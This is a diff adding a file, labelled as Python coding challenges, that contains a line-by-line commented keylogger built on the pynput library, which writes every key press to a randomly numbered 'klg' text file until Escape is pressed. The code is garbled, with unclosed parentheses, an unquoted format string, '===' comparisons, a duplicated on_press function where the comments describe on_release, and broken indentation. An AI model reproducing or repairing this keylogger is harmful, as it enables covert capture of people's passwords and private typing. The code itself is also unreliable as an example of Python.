@@ -1,0 +1,44 @@
+# Python-Coding-Challenges
+Coding challenges from Basic to advanced
+
+
+from random import randint
+#randint is a random integer- function that generates a random number
+from pynput.keyboard import Key, Listener
+##Pynput- module we downloaded from Github to use Key and Listener
+
+output='klg'+str(randint(0,1000)+'.txt'
+#file name  programmed to be named ‘klg’ with random integer number from 0 to 1000, and to be saved as a text file
+with open(output, 'w') as f:
+# with open function opens a file or creates a file handler
+f.close()
+#close function to close the handler
+
+def on_press(key):
+#function on_press is used to detect and control input devices, mouse and keyboard
+  with open(output,'a')as f:
+  #we open the file (output) as where the data will be stored
+     f.write({0}pressed\n.format(key)
+#as file is open we use function f.write
+#{0}that’s where the key is gonna be formatted when pressed
+#command \n make a new line after a keyboard is pressed
+#.format(key) is used to add they key to the beginning of the string
+     f.close()
+#f.close function to close the file handler
+
+#Then we do exactly opposite and use condition on_release, the method is used to identify when the button is released
+
+def on_press(key):
+   with open(output,'a')as f:
+      f.write({0}pressed\n.format(key)
+      f.close()
+  if key===key.esc
+ # if key is equal to Escape
+   return False
+
+with Listener(on_press=on_press) as Listener:
+    Listener.join()
+# Listener listens for spacebar, arrow, shift keys on press
+# listener.join() remove if main thread is polling self.keys
+
+
